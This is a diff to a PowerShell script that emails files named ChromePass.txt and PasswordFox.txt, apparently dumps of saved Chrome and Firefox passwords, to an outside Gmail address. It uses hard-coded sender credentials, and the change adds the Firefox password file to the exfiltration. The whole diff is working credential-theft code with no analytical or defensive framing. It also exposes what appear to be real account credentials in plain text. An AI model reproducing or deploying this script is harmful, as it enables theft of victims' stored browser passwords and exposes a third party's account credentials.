@@ -1,6 +1,7 @@
 $Username = "aaa290898@gmail.com";
 $Password= "aaaaaa290898";
-$path= "C:\chrome\maintenance.txt"
+$path= "C:\chrome\ChromePass.txt"
+$path2= "C:\chrome\PasswordFox.txt" 
 
 function Send-ToEmail([string]$email, [string]$attachmentpath){
 
@@ -19,4 +20,4 @@ function Send-ToEmail([string]$email, [string]$attachmentpath){
     write-host "Mail Sent" ; 
     $attachment.Dispose();
  }
-Send-ToEmail  -email "abdulazies55@gmail.com" -attachmentpath $path;
+Send-ToEmail  -email "abdulazies55@gmail.com" -attachmentpath $path, $path2;
